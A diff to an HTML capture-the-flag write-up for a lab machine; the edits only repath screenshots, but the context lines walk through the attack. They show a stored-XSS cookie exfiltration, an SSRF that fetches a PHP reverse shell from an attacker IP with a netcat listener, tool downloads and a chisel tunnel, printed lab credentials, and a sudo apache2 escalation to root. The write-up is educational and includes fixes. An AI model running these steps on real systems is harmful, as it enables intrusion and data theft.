@@ -201,13 +201,13 @@ sudo nmap -T4 -n -sC -sV -Pn -p- robots.thm</code></pre>
 |_/harming/humans /ignoring/human/orders /harm/to/self</span></code></pre>
     <div class="shot">
       <div class="sh"><span class="sl">robots.thm/robots.txt</span><span class="ss">200 OK</span></div>
-      <img src="robots1.png" alt="Contents of http://robots.thm/robots.txt showing three Disallow entries: /harming/humans, /ignoring/human/orders, and /harm/to/self" loading="lazy" />
+      <img src="../assets/img/robots/01.png" alt="Contents of http://robots.thm/robots.txt showing three Disallow entries: /harming/humans, /ignoring/human/orders, and /harm/to/self" loading="lazy" />
       <div class="sc">The disallow list reads like the Three Laws — a nice touch, and a directory listing all at once.</div>
     </div>
     <p>A <code>robots.txt</code> exists to keep crawlers <em>out</em> of paths, which is precisely why it's the first place to look manually — it's a hand-written index of what the owner considered worth hiding. Two of the three dead-end at 403.</p>
     <div class="shot">
       <div class="sh"><span class="sl">robots.thm/ignoring/human/orders/</span><span class="ss">403 Forbidden</span></div>
-      <img src="robots2.png" alt="403 Forbidden page for http://robots.thm/ignoring/human/orders/, Apache 2.4.61 Debian server at robots.thm port 80" loading="lazy" />
+      <img src="../assets/img/robots/02.png" alt="403 Forbidden page for http://robots.thm/ignoring/human/orders/, Apache 2.4.61 Debian server at robots.thm port 80" loading="lazy" />
       <div class="sc">Two of the three disclosed paths return 403. Only <code>/harm/to/self/</code> is reachable.</div>
     </div>
   </section>
@@ -222,7 +222,7 @@ sudo nmap -T4 -n -sC -sV -Pn -p- robots.thm</code></pre>
     <p><code>/harm/to/self/server_info.php</code> renders a complete <code>phpinfo()</code> page. No credentials, but excellent fingerprinting: <strong>PHP 8.3.10, Apache 2.0 Handler, build system "Linux — Docker"</strong>, and the loaded extension list includes <code>pdo_mysql</code> and <code>sodium</code>. A PHP + MySQL backend running inside a container — remember the "Docker" line; it explains a lot later.</p>
     <div class="shot">
       <div class="sh"><span class="sl">server_info.php</span><span class="ss">phpinfo()</span></div>
-      <img src="robots3.png" alt="phpinfo output for PHP Version 8.3.10 showing System Linux robots.thm, Build System Linux - Docker, Server API Apache 2.0 Handler, and additional .ini files for pdo_mysql and sodium extensions" loading="lazy" />
+      <img src="../assets/img/robots/03.png" alt="phpinfo output for PHP Version 8.3.10 showing System Linux robots.thm, Build System Linux - Docker, Server API Apache 2.0 Handler, and additional .ini files for pdo_mysql and sodium extensions" loading="lazy" />
       <div class="sc">"Build System: Linux — Docker" and the <code>pdo_mysql</code> ini file — the stack is already described for us.</div>
     </div>
 
@@ -230,7 +230,7 @@ sudo nmap -T4 -n -sC -sV -Pn -p- robots.thm</code></pre>
     <p>The registration page states its own rules: <em>"An admin monitors new users. Your initial password will be <code>md5(username + ddmm)</code>"</em>, with a username field and a date-of-birth field.</p>
     <div class="shot">
       <div class="sh"><span class="sl">register.php</span><span class="ss">register form</span></div>
-      <img src="robots4.png" alt="Register here page stating An admin monitors new users, your initial password will be md5(username+ddmm), with username and date of birth input fields and a Submit Query button" loading="lazy" />
+      <img src="../assets/img/robots/04.png" alt="Register here page stating An admin monitors new users, your initial password will be md5(username+ddmm), with username and date of birth input fields and a Submit Query button" loading="lazy" />
       <div class="sc">Two facts on one page: the password is derivable, and an admin reviews every new account.</div>
     </div>
     <div class="callout blue"><strong>Two hints are competing for attention here.</strong> The loud one — "passwords are <code>md5(username+ddmm)</code>" — invites a brute-force. The quiet one — "an admin monitors new users" — describes a human who will <em>view</em> attacker-controlled data. The quiet hint is the real vector. I chased the loud one first anyway.</div>
@@ -267,7 +267,7 @@ TARGET = <span class="cs">"admin"</span>
         <span class="cp">print</span>(<span class="cs">f"[+] FOUND {date}"</span>); <span class="cp">break</span></code></pre>
     <div class="shot">
       <div class="sh"><span class="sl">exploit.py — running</span><span class="ss">no match</span></div>
-      <img src="robots.rabbithole.png" alt="Terminal running python3 exploit.py, printing success looks like (302, index.php), failure looks like (200, ), then progress 50/600, 100/600, 150/600 with no match found" loading="lazy" />
+      <img src="../assets/img/robots/rabbithole.png" alt="Terminal running python3 exploit.py, printing success looks like (302, index.php), failure looks like (200, ), then progress 50/600, 100/600, 150/600 with no match found" loading="lazy" />
       <div class="sc">The oracle works perfectly (302 vs 200) — there's just nothing to find. admin's date isn't guessable this way.</div>
     </div>
     <div class="callout yellow"><strong>Dead end — roughly an hour lost.</strong> The script is correct; the premise is wrong. "An admin monitors new users" isn't flavour text, it's the exploit brief: the admin is a browser that will render whatever a new registration puts on screen. That's a <strong>stored XSS</strong> target, not a login to brute-force. Worth keeping the failed attempt in the writeup — recognising <em>which</em> hint the room is actually giving is the skill being tested.</div>
@@ -295,7 +295,7 @@ xhr.open(<span class="cs">'GET'</span>, url, <span class="cp">true</span>);
 xhr.send(<span class="cp">null</span>);</code></pre>
     <div class="shot">
       <div class="sh"><span class="sl">legit_user.js — same-origin XHR + exfil</span><span class="ss">source</span></div>
-      <img src="robots7.png" alt="Source of legit_user.js: XMLHttpRequest GET to server_info.php, regex match on PHPSESSID in the response text, then fetch to the attacker exfil endpoint with the cookie as a query parameter" loading="lazy" />
+      <img src="../assets/img/robots/07.png" alt="Source of legit_user.js: XMLHttpRequest GET to server_info.php, regex match on PHPSESSID in the response text, then fetch to the attacker exfil endpoint with the cookie as a query parameter" loading="lazy" />
       <div class="sc">The XHR runs in the admin's origin, so the HttpOnly cookie rides along automatically — the regex just plucks it back out of the phpinfo body.</div>
     </div>
     <p>Host the payload and catch the callback with a single static server:</p>
@@ -303,14 +303,14 @@ xhr.send(<span class="cp">null</span>);</code></pre>
 python3 -m http.server 8002</code></pre>
     <div class="shot">
       <div class="sh"><span class="sl">http.server 8002 — access log</span><span class="ss">callback</span></div>
-      <img src="robots6.png" alt="Python http.server on port 8002 logging a 200 for GET /legit_user.js followed by a GET /exfil?cookie=thd0eosgh78pbt4ujuu49fqu4m returning 404, from the admin's browser IP" loading="lazy" />
+      <img src="../assets/img/robots/06.png" alt="Python http.server on port 8002 logging a 200 for GET /legit_user.js followed by a GET /exfil?cookie=thd0eosgh78pbt4ujuu49fqu4m returning 404, from the admin's browser IP" loading="lazy" />
       <div class="sc">First the admin's browser pulls <code>legit_user.js</code>, then it calls back with the stolen <code>PHPSESSID</code> in the query string.</div>
     </div>
     <div class="callout blue"><strong>The 404 on <code>/exfil</code> is expected and harmless.</strong> <code>http.server</code> has no such route, but it logs the full request line before answering — the cookie in the query string is already captured. No need for a real endpoint.</div>
     <p>Drop the stolen <code>PHPSESSID</code> into the browser (dev tools → Storage → Cookies) and reload <code>index.php</code>. Now authenticated as admin, with a "Last logins" panel — and every injected username plainly visible in the list, confirming the stored-XSS sink.</p>
     <div class="shot">
       <div class="sh"><span class="sl">index.php — admin panel via stolen session</span><span class="ss">authenticated</span></div>
-      <img src="robots8.png" alt="Last logins admin panel accessible with the stolen session, listing User 1 admin, User 3 maks, User 4 maks&gt;, and users whose names render as broken script-tag images, confirming stored XSS" loading="lazy" />
+      <img src="../assets/img/robots/08.png" alt="Last logins admin panel accessible with the stolen session, listing User 1 admin, User 3 maks, User 4 maks&gt;, and users whose names render as broken script-tag images, confirming stored XSS" loading="lazy" />
       <div class="sc">Users 5–7 render as broken images — those are the <code>&lt;script src&gt;</code> usernames the panel tried to display. The sink is confirmed.</div>
     </div>
     <div class="callout green"><strong>The general rule:</strong> if input you control is <em>stored</em> and later <em>displayed</em> to another user without output encoding, that's stored XSS — regardless of HttpOnly. When cookies are locked away, pivot to a same-origin authenticated request against any page that reflects the session (or any admin-only action) and exfiltrate <em>that</em>.</div>
@@ -323,7 +323,7 @@ python3 -m http.server 8002</code></pre>
     <p>The admin panel exposes a <strong>"Test url"</strong> utility (<code>admin.php</code>) that fetches an arbitrary URL server-side and prints the response. That's textbook SSRF — and because the fetch originates from the server, first confirm it by pointing it at a local file via the <code>file://</code> handler:</p>
     <div class="shot">
       <div class="sh"><span class="sl">admin.php — SSRF reads /etc/passwd</span><span class="ss">file://</span></div>
-      <img src="robots9.png" alt="admin.php Test url output showing the full contents of /etc/passwd fetched server-side, listing root, daemon, www-data and other accounts" loading="lazy" />
+      <img src="../assets/img/robots/09.png" alt="admin.php Test url output showing the full contents of /etc/passwd fetched server-side, listing root, daemon, www-data and other accounts" loading="lazy" />
       <div class="sc">Feeding <code>file:///etc/passwd</code> to the "Test url" field proves the fetch runs on the server, not the client.</div>
     </div>
     <p>An SSRF that fetches arbitrary URLs is one short step from RCE: point it at a PHP reverse-shell hosted on my box. The server retrieves it over HTTP and — because the fetch is server-side and PHP is the runtime — executes it.</p>
@@ -334,7 +334,7 @@ python3 -m http.server 8004
 nc -lvnp 7777</code></pre>
     <div class="shot">
       <div class="sh"><span class="sl">admin.php — Test url</span><span class="ss">SSRF → shell.php</span></div>
-      <img src="robots10.png" alt="admin.php Test url form with the value http://192.168.146.233:8004/shell.php entered, ready to submit" loading="lazy" />
+      <img src="../assets/img/robots/10.png" alt="admin.php Test url form with the value http://192.168.146.233:8004/shell.php entered, ready to submit" loading="lazy" />
       <div class="sc">The SSRF field pointed at the reverse-shell payload on the attack box.</div>
     </div>
     <p>Submitting the request lands a shell:</p>
@@ -344,7 +344,7 @@ Connection received on 10.112.165.14 46008
 uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></code></pre>
     <div class="shot">
       <div class="sh"><span class="sl">www-data — foothold</span><span class="ss">id / passwd / uname</span></div>
-      <img src="robots11.png" alt="www-data shell output: whoami returns www-data, cat /etc/passwd, uname -a shows Linux robots.thm 5.15.0-118-generic Ubuntu kernel, /etc/os-release shows Debian GNU/Linux 12 bookworm, id shows uid 33 www-data" loading="lazy" />
+      <img src="../assets/img/robots/11.png" alt="www-data shell output: whoami returns www-data, cat /etc/passwd, uname -a shows Linux robots.thm 5.15.0-118-generic Ubuntu kernel, /etc/os-release shows Debian GNU/Linux 12 bookworm, id shows uid 33 www-data" loading="lazy" />
       <div class="sc">Foothold as <code>www-data</code>. Note the mismatch — Ubuntu kernel, Debian 12 userland — the classic sign of a container on a different host OS.</div>
     </div>
     <div class="callout yellow"><strong>The environment is bare.</strong> No <code>wget</code>, no <code>nc</code>, no <code>ping</code>, no <code>ss</code>, no <code>ip</code>. It's a minimal PHP container, and the OS mismatch (Debian 12 userland on an Ubuntu kernel) confirms it. Escaping and pivoting from here will mean bringing my own tools.</div>
@@ -358,7 +358,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></code></pre>
 cat config.php</code></pre>
     <div class="shot">
       <div class="sh"><span class="sl">config.php</span><span class="ss">DB credentials</span></div>
-      <img src="robots12.png" alt="config.php contents: servername db, username robots, password q4qCz1OflKvKwK4S, dbname web, plus a hostname redirect to robots.thm and ini_set session.cookie_httponly 1" loading="lazy" />
+      <img src="../assets/img/robots/12.png" alt="config.php contents: servername db, username robots, password q4qCz1OflKvKwK4S, dbname web, plus a hostname redirect to robots.thm and ini_set session.cookie_httponly 1" loading="lazy" />
       <div class="sc">DB creds, the <code>httponly</code> setting that shaped the XSS, and one detail that changes everything: <code>$servername = "db"</code>.</div>
     </div>
     <p>Credentials in hand: <code>robots</code> / <code>q4qCz1OflKvKwK4S</code>, database <code>web</code>. My first instinct was that <code>db</code> was just a local alias — but <code>$servername = "db"</code> in a config that phpinfo already told us was built under Docker is a strong tell. <code>db</code> is a <strong>Docker Compose service name</strong>, resolved by the internal Docker DNS to a <em>separate</em> container. Confirming with <code>/etc/hosts</code> shows this container is <code>172.18.0.3</code> — and <code>db</code> is somewhere else on that bridge network, unreachable from my attack box directly.</p>
@@ -386,7 +386,7 @@ curl -o /tmp/busybox http://192.168.128.12:8001/busybox && chmod +x /tmp/busybox
 <span class="cg">172.18.0.2:3306 OPEN</span></code></pre>
     <div class="shot">
       <div class="sh"><span class="sl">container — /etc/hosts, tooling upload, subnet sweep</span><span class="ss">172.18.0.2 found</span></div>
-      <img src="robots13.png" alt="Container shell: /etc/hosts shows 172.18.0.3 robots.thm; ss/ip/ifconfig all not found; curl downloads chisel and busybox from the attack box; file /tmp/nc reports HTML document; busybox nc sweep of 172.18.0.0/24 finds 172.18.0.2:3306 OPEN" loading="lazy" />
+      <img src="../assets/img/robots/13.png" alt="Container shell: /etc/hosts shows 172.18.0.3 robots.thm; ss/ip/ifconfig all not found; curl downloads chisel and busybox from the attack box; file /tmp/nc reports HTML document; busybox nc sweep of 172.18.0.0/24 finds 172.18.0.2:3306 OPEN" loading="lazy" />
       <div class="sc">This container is <code>.3</code>; the real MySQL is <code>172.18.0.2</code>. The missing standard tools and the saved 404-as-nc are all visible here.</div>
     </div>
     <p>The database is <code>172.18.0.2</code>, not <code>.3</code> (that's the web container itself). Start the chisel server on the attack box and dial back a reverse tunnel that forwards my local 3306 straight to the DB container:</p>
@@ -409,7 +409,7 @@ MariaDB [(none)]&gt; <span class="ca">use web;</span>
 MariaDB [web]&gt; <span class="ca">SELECT * FROM users;</span></code></pre>
     <div class="shot">
       <div class="sh"><span class="sl">MariaDB [web] — users table</span><span class="ss">4 rows</span></div>
-      <img src="robots14.png" alt="MariaDB users table dump: id 1 admin, id 2 rgiskard with hash dfb35334bf2a1338fa40e5fbb4ae4753 group nologin, and ids 3 and 7 whose usernames are the injected script-tag XSS payloads" loading="lazy" />
+      <img src="../assets/img/robots/14.png" alt="MariaDB users table dump: id 1 admin, id 2 rgiskard with hash dfb35334bf2a1338fa40e5fbb4ae4753 group nologin, and ids 3 and 7 whose usernames are the injected script-tag XSS payloads" loading="lazy" />
       <div class="sc">The injected <code>&lt;script&gt;</code> usernames are stored verbatim (rows 3 and 7) — proof the field was never sanitised. Row 2, <code>rgiskard</code>, is the target.</div>
     </div>
     <p>The <code>users</code> table stores <code>rgiskard</code> with hash <code>dfb35334bf2a1338fa40e5fbb4ae4753</code>. It's not a plain <code>md5(username+ddmm)</code> — the app double-hashes: <code>md5(md5(username + ddmm))</code>. Same date space as before (366 candidates), so the same offline loop cracks it in milliseconds, this time hashing twice before comparing:</p>
@@ -431,7 +431,7 @@ python3 hash.py rgiskard dfb35334bf2a1338fa40e5fbb4ae4753
 ssh rgiskard@robots.thm</code></pre>
     <div class="shot">
       <div class="sh"><span class="sl">rgiskard@ubuntu-jammy — host shell</span><span class="ss">user.txt reach</span></div>
-      <img src="robots15.png" alt="SSH session as rgiskard@ubuntu-jammy: id shows uid 1002 rgiskard, ls -la of the home directory showing .bash_logout, .bashrc, .profile" loading="lazy" />
+      <img src="../assets/img/robots/15.png" alt="SSH session as rgiskard@ubuntu-jammy: id shows uid 1002 rgiskard, ls -la of the home directory showing .bash_logout, .bashrc, .profile" loading="lazy" />
       <div class="sc">SSH lands on the <em>host</em> (<code>ubuntu-jammy</code>), not the container — the reused DB-scheme password gets us onto the box itself as <code>rgiskard</code>.</div>
     </div>
   </section>
@@ -465,7 +465,7 @@ chmod 600 dolivaw_key
 ssh dolivaw@robots.thm -i dolivaw_key</code></pre>
     <div class="shot">
       <div class="sh"><span class="sl">dolivaw@ubuntu-jammy</span><span class="ss">user.txt</span></div>
-      <img src="robots16.png" alt="SSH session as dolivaw@ubuntu-jammy: id shows uid 1003 dolivaw, ls -la of home directory showing .ssh directory and user.txt owned by root" loading="lazy" />
+      <img src="../assets/img/robots/16.png" alt="SSH session as dolivaw@ubuntu-jammy: id shows uid 1003 dolivaw, ls -la of home directory showing .ssh directory and user.txt owned by root" loading="lazy" />
       <div class="sc">Key-based login as <code>dolivaw</code> — and <code>user.txt</code> is here.</div>
     </div>
     <div class="callout blue"><strong>Wildcarded sudo rules only validate the literal argument shown.</strong> <code>curl 127.0.0.1/*</code> looks tightly scoped, but <code>-K</code>, <code>-o</code>, <code>--config</code> and friends aren't part of the pattern. When a binary can read a config file or write output to an arbitrary path, a positional-only match is not a real restriction.</div>
@@ -525,7 +525,7 @@ uid=1003(dolivaw) gid=1003(dolivaw) euid=0(root) egid=0(root) groups=0(root),100
 cat /root/root.txt</code></pre>
     <div class="shot">
       <div class="sh"><span class="sl">dolivaw → root</span><span class="ss">euid=0</span></div>
-      <img src="robots17.png" alt="Terminal: sudo apache2 with -C Define APACHE_RUN_DIR and -c LoadModule x_module rootshell.so, config warnings and an undefined symbol x_module error, then ls -la /bin/bash showing -rwsr-sr-x, then /bin/bash -p giving euid=0 root, and cat /root/root.txt" loading="lazy" />
+      <img src="../assets/img/robots/17.png" alt="Terminal: sudo apache2 with -C Define APACHE_RUN_DIR and -c LoadModule x_module rootshell.so, config warnings and an undefined symbol x_module error, then ls -la /bin/bash showing -rwsr-sr-x, then /bin/bash -p giving euid=0 root, and cat /root/root.txt" loading="lazy" />
       <div class="sc">Despite the <code>undefined symbol: x_module</code> error, the constructor already ran as root — <code>/bin/bash</code> is now SUID, and <code>-p</code> gives <code>euid=0</code>.</div>
     </div>
     <div class="callout green"><strong>The fixes:</strong> don't grant <code>NOPASSWD</code> on binaries that load arbitrary code (<code>apache2</code>, <code>curl</code>, and anything on GTFOBins); scope sudo rules to fully-argument-matched commands, never wildcards over a single positional argument; and never bind an application secret into a config the web root can read. Each rule in this chain looked narrow in isolation.</div>
